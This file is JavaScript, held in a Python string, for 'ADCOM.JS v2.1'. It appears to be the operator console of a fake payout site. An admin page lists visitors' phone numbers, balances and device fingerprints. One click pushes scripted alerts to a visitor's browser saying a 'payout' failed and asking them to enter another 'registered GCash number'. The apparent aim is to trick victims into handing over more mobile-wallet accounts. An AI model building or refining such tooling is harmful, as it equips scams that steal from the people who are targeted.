
improved_code_v2 = '''/**
 * ADCOM.JS v2.1 - Admin Command System with Real-Time Notifications
 * 
 * FEATURES:
 * - Real-time user notifications via Firebase onValue listener
 * - Admin popup with user info and command buttons
 * - Clickable phone numbers in admin tables
 * - Clears userPhone from localStorage after alert
 * - Timestamp tracking for commands
 */

// ========== DETECT CURRENT PAGE ==========
const isAdminPage = window.location.pathname.includes('admin') || 
                    window.location.pathname.includes('admin_12820') ||
                    document.querySelector('.cia-header') !== null;

// ========== CONFIGURATION ==========
const CONFIG = {
    // Firebase paths
    USER_SESSIONS_PATH: 'user_sessions',
    ADMIN_COMMANDS_PATH: 'admin_commands',
    
    // Messages
    MSG_WRONG_NUMBER: '⚠️ Payout Unsuccessful! Please use your registered GCash number.',
    MSG_RESTRICTED: '⚠️ Payout Unsuccessful! Your number is restricted. Use another registered number.',
    
    // Timing
    POPUP_DELAY: 1000,
    LISTENER_DELAY: 1500,
    INITIAL_CHECK_DELAY: 2000
};

// ========== CSS PARA SA ADMIN POPUP ==========
if (isAdminPage) {
    const style = document.createElement('style');
    style.textContent = `
        .admin-command-popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 9999999;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .admin-command-popup-content {
            width: 90%;
            max-width: 400px;
            background: #1a1a2e;
            border-radius: 16px;
            border: 2px solid #00f2ff;
            overflow: hidden;
            animation: slideUp 0.3s ease;
        }
        @keyframes slideUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        .admin-command-popup-header {
            padding: 15px;
            background: rgba(0,242,255,0.1);
            border-bottom: 1px solid #00f2ff;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .admin-command-popup-header h3 { 
            color: #00f2ff; 
            margin: 0; 
            font-size: 14px; 
            font-weight: 600;
        }
        .close-popup { 
            background: none; 
            border: none; 
            color: #fff; 
            font-size: 20px; 
            cursor: pointer;
            transition: color 0.2s;
        }
        .close-popup:hover { color: #ff4444; }
        .user-info-section { padding: 15px; }
        .info-row { 
            margin-bottom: 10px; 
            font-size: 13px;
            display: flex;
            align-items: center;
        }
        .info-label { 
            color: #888; 
            display: inline-block; 
            width: 100px;
            flex-shrink: 0;
        }
        .info-value { 
            color: #fff; 
            font-weight: 500;
        }
        .command-buttons-section { 
            padding: 15px; 
            border-top: 1px solid #333; 
        }
        .command-buttons-grid { 
            display: flex; 
            gap: 10px; 
        }
        .command-btn { 
            flex: 1; 
            padding: 12px; 
            border: none; 
            border-radius: 10px; 
            font-weight: bold; 
            cursor: pointer;
            transition: transform 0.2s, opacity 0.2s;
            font-size: 12px;
        }
        .command-btn:hover {
            transform: translateY(-2px);
            opacity: 0.9;
        }
        .command-btn:active {
            transform: translateY(0);
        }
        .command-1 { background: #ff9800; color: #fff; }
        .command-2 { background: #2196f3; color: #fff; }
        .clickable-phone { 
            cursor: pointer; 
            color: #00f2ff; 
            text-decoration: underline;
            transition: color 0.2s;
        }
        .clickable-phone:hover {
            color: #80f7ff;
        }
        .sent-badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 10px;
            margin-left: 8px;
        }
        .badge-success { background: #4caf50; color: #fff; }
        .badge-pending { background: #ff9800; color: #fff; }
    `;
    document.head.appendChild(style);
}

// ========== UTILITY FUNCTIONS ==========
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function formatPhone(phone) {
    // Sanitize phone number for Firebase key
    return phone.replace(/[^0-9]/g, '');
}

function showToast(message, type = 'success') {
    // Create toast notification
    const toast = document.createElement('div');
    toast.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 12px 20px;
        border-radius: 8px;
        color: #fff;
        font-weight: 500;
        z-index: 99999999;
        animation: slideInRight 0.3s ease;
        max-width: 300px;
        word-wrap: break-word;
    `;
    toast.style.background = type === 'success' ? '#4caf50' : '#ff4444';
    toast.textContent = message;
    
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.style.animation = 'slideOutRight 0.3s ease';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// ========== ADMIN: SHOW USER POPUP ==========
async function showUserDetailsPopup(phone) {
    if (!isAdminPage) return;
    
    const sanitizedPhone = formatPhone(phone);
    const userSnap = await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + sanitizedPhone).once('value');
    const userData = userSnap.val();
    
    if (!userData) {
        showToast('User not found or offline', 'error');
        return;
    }
    
    const balance = (userData.balance || 0).toFixed(2);
    const device = userData.deviceFingerprint || 'Unknown';
    const lastActive = userData.lastActive ? new Date(userData.lastActive).toLocaleString() : 'N/A';
    
    // Check if user already has pending command
    const hasPendingCommand = !!userData.adminCommand;
    
    const popupHTML = `
        <div id="userCommandPopup" class="admin-command-popup">
            <div class="admin-command-popup-content">
                <div class="admin-command-popup-header">
                    <h3>👤 SEND MESSAGE ${hasPendingCommand ? '<span class="sent-badge badge-pending">PENDING</span>' : ''}</h3>
                    <button class="close-popup" onclick="closeUserCommandPopup()">✕</button>
                </div>
                <div class="user-info-section">
                    <div class="info-row">
                        <span class="info-label">📱 Number:</span>
                        <span class="info-value">${escapeHtml(phone)}</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">💰 Balance:</span>
                        <span class="info-value">₱${balance}</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">🔑 Device:</span>
                        <span class="info-value">${escapeHtml(device.substring(0, 20))}...</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">🕐 Last Active:</span>
                        <span class="info-value">${lastActive}</span>
                    </div>
                </div>
                <div class="command-buttons-section">
                    <div class="command-buttons-grid">
                        <button class="command-btn command-1" onclick="sendCommand('${escapeHtml(phone)}', '1')">
                            📧 WRONG NUMBER
                        </button>
                        <button class="command-btn command-2" onclick="sendCommand('${escapeHtml(phone)}', '2')">
                            📞 RESTRICTED
                        </button>
                    </div>
                </div>
            </div>
        </div>
    `;
    
    closeUserCommandPopup(); // Close any existing popup
    document.body.insertAdjacentHTML('beforeend', popupHTML);
}

function closeUserCommandPopup() {
    const popup = document.getElementById('userCommandPopup');
    if (popup) {
        popup.style.animation = 'fadeOut 0.2s ease';
        setTimeout(() => popup.remove(), 200);
    }
}

// ========== ADMIN: SEND COMMAND ==========
async function sendCommand(phone, type) {
    if (!isAdminPage) return;
    
    closeUserCommandPopup();
    
    const sanitizedPhone = formatPhone(phone);
    const message = type === '1' ? CONFIG.MSG_WRONG_NUMBER : CONFIG.MSG_RESTRICTED;
    
    try {
        // Save command with timestamp
        await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + sanitizedPhone).update({
            adminCommand: message,
            commandTimestamp: Date.now(),
            commandType: type,
            commandStatus: 'pending'
        });
        
        showToast('✅ Message sent to user!');
        
        // Optional: Log admin action
        await logAdminAction('send_command', {
            targetPhone: sanitizedPhone,
            commandType: type,
            timestamp: Date.now()
        });
        
    } catch (error) {
        console.error('Send command error:', error);
        showToast('❌ Failed to send message', 'error');
    }
}

// ========== ADMIN: LOG ACTION (Optional) ==========
async function logAdminAction(action, data) {
    try {
        await db.ref('admin_logs').push({
            action: action,
            data: data,
            adminDevice: localStorage.getItem('adminDeviceId') || 'unknown',
            timestamp: Date.now()
        });
    } catch (e) {
        console.log('Log error:', e);
    }
}

// ========== ADMIN: MAKE PHONES CLICKABLE ==========
function makePhonesClickable() {
    if (!isAdminPage) return;
    
    const phoneRegex = /^(\\+63\\d{10}|09\\d{9})$/;
    
    document.querySelectorAll('#ghostData td, #ghostData td *').forEach(cell => {
        // Get text content, not innerHTML to avoid issues with child elements
        const text = cell.textContent || cell.innerText || '';
        const trimmedText = text.trim();
        
        if (phoneRegex.test(trimmedText) && !cell.hasAttribute('data-clickable')) {
            cell.setAttribute('data-clickable', 'true');
            cell.style.cursor = 'pointer';
            cell.style.color = '#00f2ff';
            cell.style.textDecoration = 'underline';
            cell.style.fontWeight = '500';
            
            cell.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                showUserDetailsPopup(trimmedText);
            });
        }
    });
}

function observeTableChanges() {
    if (!isAdminPage) return;
    
    const target = document.getElementById('ghostData');
    if (!target) {
        console.log('ghostData table not found, retrying...');
        setTimeout(observeTableChanges, 2000);
        return;
    }
    
    const observer = new MutationObserver((mutations) => {
        let shouldUpdate = false;
        mutations.forEach((mutation) => {
            if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                shouldUpdate = true;
            }
        });
        if (shouldUpdate) {
            makePhonesClickable();
        }
    });
    
    observer.observe(target, { 
        childList: true, 
        subtree: true 
    });
    
    makePhonesClickable();
    console.log('✅ Admin phone observer initialized');
}

// ========== USER: REAL-TIME COMMAND LISTENER ==========
let commandListenerActive = false;
let commandUnsubscribe = null;

function startRealTimeCommandListener() {
    const userPhone = localStorage.getItem('userPhone');
    if (!userPhone || commandListenerActive) return;
    
    const sanitizedPhone = formatPhone(userPhone);
    
    console.log('🔔 Starting real-time command listener for:', sanitizedPhone);
    
    commandListenerActive = true;
    
    // Use onValue for real-time updates
    commandUnsubscribe = db.ref(CONFIG.USER_SESSIONS_PATH + '/' + sanitizedPhone + '/adminCommand')
        .on('value', async (snapshot) => {
            const message = snapshot.val();
            
            if (message) {
                console.log('📨 Admin command received:', message);
                
                // Show alert to user
                alert(message);
                
                // Mark command as received
                await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + sanitizedPhone).update({
                    commandStatus: 'received',
                    commandReceivedAt: Date.now()
                });
                
                // Clear the command after alert is dismissed
                await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + sanitizedPhone + '/adminCommand').remove();
                
                // CLEAR userPhone from localStorage (as requested)
                localStorage.removeItem('userPhone');
                console.log('🗑️ userPhone cleared from localStorage');
                
                // Stop the listener since userPhone is now gone
                stopRealTimeCommandListener();
            }
        }, (error) => {
            console.error('Command listener error:', error);
            commandListenerActive = false;
            // Retry connection after delay
            setTimeout(startRealTimeCommandListener, 5000);
        });
}

function stopRealTimeCommandListener() {
    if (commandUnsubscribe) {
        commandUnsubscribe();
        commandUnsubscribe = null;
    }
    commandListenerActive = false;
    console.log('🛑 Command listener stopped');
}

// ========== USER: FALLBACK ACTION-BASED CHECKING ==========
// This serves as backup in case real-time listener fails
async function checkForAdminCommand() {
    const userPhone = localStorage.getItem('userPhone');
    if (!userPhone) return false;
    
    try {
        const sanitizedPhone = formatPhone(userPhone);
        const snapshot = await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + sanitizedPhone).once('value');
        const userData = snapshot.val();
        
        if (userData && userData.adminCommand) {
            const message = userData.adminCommand;
            
            alert(message);
            
            // Clear command
            await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + sanitizedPhone + '/adminCommand').remove();
            
            // CLEAR userPhone from localStorage (as requested)
            localStorage.removeItem('userPhone');
            console.log('🗑️ userPhone cleared from localStorage (fallback)');
            
            return true;
        }
    } catch (error) {
        console.log('Fallback check error:', error);
    }
    
    return false;
}

function hookUserActions() {
    // Backup: Check on user actions (in case listener is not active)
    document.body.addEventListener('click', async function(e) {
        if (!commandListenerActive) {
            await checkForAdminCommand();
        }
    }, true);
    
    document.body.addEventListener('submit', async function(e) {
        if (!commandListenerActive) {
            await checkForAdminCommand();
        }
    }, true);
}

// ========== VISIBILITY API: Reconnect when tab becomes active ==========
document.addEventListener('visibilitychange', () => {
    if (!document.hidden && !isAdminPage) {
        // Tab became visible, ensure listener is active
        const userPhone = localStorage.getItem('userPhone');
        if (userPhone && !commandListenerActive) {
            console.log('Tab visible, restarting command listener...');
            startRealTimeCommandListener();
        }
    }
});

// ========== START ==========
function init() {
    console.log('🚀 ADCOM.JS v2.1 initializing...');
    console.log('Admin page:', isAdminPage);
    
    if (isAdminPage) {
        // ADMIN SIDE
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(observeTableChanges, CONFIG.POPUP_DELAY);
            });
        } else {
            setTimeout(observeTableChanges, CONFIG.POPUP_DELAY);
        }
    } else {
        // USER SIDE
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => {
                    startRealTimeCommandListener();
                    hookUserActions();
                }, CONFIG.LISTENER_DELAY);
                
                // Initial fallback check
                setTimeout(checkForAdminCommand, CONFIG.INITIAL_CHECK_DELAY);
            });
        } else {
            setTimeout(() => {
                startRealTimeCommandListener();
                hookUserActions();
            }, CONFIG.LISTENER_DELAY);
            setTimeout(checkForAdminCommand, CONFIG.INITIAL_CHECK_DELAY);
        }
    }
}

// Handle page unload
window.addEventListener('beforeunload', () => {
    if (!isAdminPage) {
        stopRealTimeCommandListener();
    }
});

init();
